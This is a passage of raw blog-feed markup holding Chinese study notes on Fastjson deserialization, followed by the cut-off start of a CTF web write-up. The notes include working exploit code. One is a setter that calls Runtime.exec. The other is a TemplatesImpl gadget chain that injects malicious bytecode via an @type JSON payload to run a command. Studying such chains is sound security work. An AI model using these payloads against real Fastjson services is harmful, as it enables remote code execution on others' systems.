class_">User</span>();<br>        user.setName(<span class="hljs-string">&quot;abc&quot;</span>);<br>        user.setId(<span class="hljs-number">6</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>        System.out.println(jsonString);<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson3.png" alt="fastjson3"></p><p>但是这里转化的字符串只有属性的值，无法区分是哪个类进行了序列化转化的字符串，这里就有了在<code>JSON.toJSONString</code>的第二个参数<code>SerializerFeature.WriteClassName</code>写下这个类的名字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//UserSer.java</span><br><span class="hljs-keyword">package</span> MyJson;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserSer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setName(<span class="hljs-string">&quot;abc&quot;</span>);<br>        user.setId(<span class="hljs-number">6</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);<br>        System.out.println(jsonString);<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson2.png" alt="fastjson2"></p><p><code>SerializerFeature.WriteClassName</code> 是 Fastjson 序列化特性，它表示在生成的 JSON 字符串中包含类名信息。设置之后在序列化的时候会多写入一个@type，标识的是这个字符串是由某个类序列化而来，并且调用其 <code>getter</code>&#x2F;<code>setter</code>&#x2F;<code>is</code> 方法。</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>将 json 数据反序列化时常使用的方法为<code>parse()</code>、<code>parseObject()</code>。</p><ul><li><p><code>parse()</code> 方法用于将 JSON 字符串转换为单个的 Java 对象。</p></li><li><p>返回的是一个泛型对象，你需要手动进行类型转换为你期望的对象类型。</p></li><li><p>如果 JSON 字符串中包含了多个对象，则只会解析第一个对象，并忽略其他对象。</p></li><li><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span> jsonObject = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonString);<br></code></pre></td></tr></table></figure></li><li><p><code>parseObject()</code> 方法用于将 JSON 字符串转换为指定类型的 Java 对象。</p></li><li><p>可以指定要转换的目标对象的类，Fastjson 将尝试将 JSON 字符串映射到该类的对象实例。</p></li><li><p>返回的是指定类型的 Java 对象。</p></li><li><p>如果 JSON 字符串中包含多个对象，则只解析第一个对象，并将其映射到指定类型的对象实例中。</p></li><li><p>示例：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Student student = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse<span class="hljs-constructor">Object(<span class="hljs-params">jsonString</span>, Student.<span class="hljs-params">class</span>)</span>;<br></code></pre></td></tr></table></figure></li></ul><p><code>eg</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> MyJson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><span class="hljs-keyword">import</span> MyJson.User;<br><span class="hljs-keyword">import</span> java.lang.reflect.Type;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;MyJson.User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parseObject(json));<br>        System.out.println(JSON.parse(json));<br>        &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson4.png" alt="fastjson4"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> MyJson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><span class="hljs-keyword">import</span> MyJson.User;<br><span class="hljs-keyword">import</span> java.lang.reflect.Type;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;MyJson.User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parseObject(json,User.class));<br>        System.out.println(JSON.parse(json));<br>        &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson5.png" alt="fastjson5"></p><p>在使用<code>JSON.parseObject</code>方法的时候只有在第二个参数指定是哪个类才会反序列化成功。</p><p>上面的json都存在<code>type</code>关键字指定类，如果没这个<code>type</code>的话：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parseObject(json2, User.class));<br>        System.out.println(JSON.parseObject(json2));<br>        System.out.println(JSON.parse(json2));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson6.png" alt="fastjson6"></p><p>所以预期的反序列化语句写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  <br>        <span class="hljs-string">&quot;\&quot;name\&quot;:\&quot;Drunkbaby\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  <br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString, Student.class);<br></code></pre></td></tr></table></figure><p>要用 <code>parseObject</code>，里面的参数需要是 <code>Object.class</code>。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><ul><li>@type 指定类</li><li>使用<code>JSON.parse</code>方法反序列化会调用此类的set方法</li><li>使用<code>JSON.parseObject</code>方法反序列化会调用此类特定的get和set方法</li><li>可以写一个恶意类，然后通过这一特性实现命令执行</li></ul><p>注意不是所有的<strong>setter&#x2F;getter方法</strong>：</p><p>满足条件的setter：</p><ul><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>非静态方法</li><li>无参数</li><li><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></li></ul><p>一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;xxx.xxx.xxx&quot;</span>,<br><span class="hljs-string">&quot;xxx&quot;</span>:<span class="hljs-string">&quot;xxx&quot;</span>,<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：</p><ol><li>该类的构造函数、<code>setter</code>方法、<code>getter</code>方法中的某一个存在危险操作，比如造成命令执行；</li><li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li></ol><h3 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//User.java</span><br>eption;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;无参构造&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;有参构造&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, id=&quot;</span> + id +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.print(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span>  &#123;<br>        System.out.println(<span class="hljs-string">&quot;getId&quot;</span>);<br>        <span class="hljs-keyword">return</span> id;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;setId&quot;</span>);<br>        <span class="hljs-built_in">this</span>.id = id;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>EXP.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> MyJson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP1</span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;MyJson.User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;<br>            System.out.println(JSON.parseObject(json,User.class));<br>        &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson7.png" alt="fastjson7"></p><p>这里如果把<code>setId</code>方法增加一个参数&#x2F;修改返回值类型为<code>int</code>都无法进行命令执行。</p><p>我们的 PoC 是把恶意代码放到一个 json 格式的字符串里面，开头是要接 <code>@type</code> 的。这里其实赋值就代表我们不需要通过反射来修改值，而是可以直接赋值。</p><p><code>@type</code> 之后是我们要去进行反序列化的类，会获取它的构造函数、getter 与 setter 方法。</p><p>所以我们首先是要找这个反序列化类的构造函数、 getter，setter 方法有问题的地方。</p><h3 id="和原生反序列化相同和不同的点："><a href="#和原生反序列化相同和不同的点：" class="headerlink" title="和原生反序列化相同和不同的点："></a>和原生反序列化相同和不同的点：</h3><ul><li>不需要实现<code>Serializable</code></li><li>变量可以是<code>transient</code>，但变量得有对应的<code>setter</code>或者是<code>public</code>&#x2F;满足条件的<code>getter</code></li><li>原生的入口点得是<code>readObject</code>，<code>fastJson</code>是<code>setter</code>&#x2F;<code>getter</code></li><li>最后执行点都得通过反射或者动态类加载</li></ul><h3 id="基于-TemplatesImpl-的利用链"><a href="#基于-TemplatesImpl-的利用链" class="headerlink" title="基于 TemplatesImpl 的利用链"></a>基于 TemplatesImpl 的利用链</h3><p>CC3 链利用<code>TemplatesImpl</code> 加载字节码进行命令执行，漏洞的终点在于调用了 <code>.newInstance()</code> 方法。回看会发现漏洞点的地方实际上是一个 <code>getter</code> 方法：</p><p><img src="/img/TemplatesImplGetter.png" alt="TemplatesImplGetter"></p><p>所以可<code>TemplatesImpl</code> 中的这个<code>getter</code>是满足利用条件的。在构造 EXP 之前，先分析一下参数:</p><ul><li>先看 TemplatesImpl 类中的 <code>getTransletInstance()</code> 方法。这里可以直接参考 CC3链子的构造。<img src="/img/getTransletInstance.png" alt="getTransletInstance"></li></ul><p><code>_name</code> 不可以为 null，需要 <code>_class</code> 为 null，这样进入到 <code>defineTransletClasses</code> 这个方法里面。所以 <code>_class</code> 可以不用写，或者写为 null。<code>_tfactory</code> 也不能为 null，<code>_bytecodes</code> 是恶意字节码。具体可以参考CC3 的分析文章。现在形成的<code>payload</code>为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json">final String NASTY_CLASS = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>final String evilClassPath = <span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>;<br><br><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string"></span><br><span class="hljs-string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="hljs-string">&quot;\&quot;,</span><br><span class="hljs-string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],</span><br><span class="hljs-string"> &#x27;_name&#x27;:&#x27;Drunkbaby&#x27;,</span><br><span class="hljs-string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>主要目标就是调用这个<code>getter</code>方法，但注意这个方法并不满足第三个利用条件：</p><p><strong>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</strong></p><p>所以要继续寻找其它<code>getter/setter</code>方法，找谁调用了 <code>getTransletInstance()</code>：<code>newTransformer()</code> 方法调用了 <code>getTransletInstance()</code> 方法</p><p><img src="/img/fastjson9.png" alt="fastjson9"></p><p> <code>getOutputProperties()</code> 调用了 <code>newTransformer()</code>：</p><p><img src="/img/fastjson11.png" alt="fastjson11"></p><p>看下这个<code>getOutputProperties()</code>方法的返回值：</p><p><img src="/img/fastjson8.png" alt="fastjson8"></p><p><code>Properties</code> 即继承自 <code>Hashtable</code>，这东西是<code>Map</code>类型的，符合要求。</p><p>利用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">getOutputProperties</span>()  ---&gt; <span class="hljs-built_in">newTransformer</span>() ---&gt; <span class="hljs-built_in">TransformerImpl</span>(getTransletInstance(), _outputProperties,  <br> _indentNumber, _tfactory);<br></code></pre></td></tr></table></figure><p>首先创建<code>Clac.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Clac</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Clac</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> MyJson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.io.IOUtils;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><br><span class="hljs-comment">// TemplatesImpl 链子的 EXP</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LastEXP</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>        IOUtils.copy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(cls)), bos);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> Base64.encodeBase64String(bos.toByteArray());<br>        &#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ParserConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserConfig</span>();<br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">fileSeparator</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;file.separator&quot;</span>);<br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:\\Clac.class&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">text1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>        <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;Drunkbaby&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>;<br>        System.out.println(text1);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);<br>        <span class="hljs-comment">//Object obj = JSON.parse(text1, Feature.SupportNonPublicField);</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>        &#125;<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3>]]></content>
    
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>H&amp;NCTF2024_部分web</title>
    <link href="/2024/04/27/hnctf/"/>
    <url>/2024/04/27/hnctf/</url>
    
    <content type="html"><![CDATA[<p>一部分web</p><span id="more"></span><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;moran&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>];<br>        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span 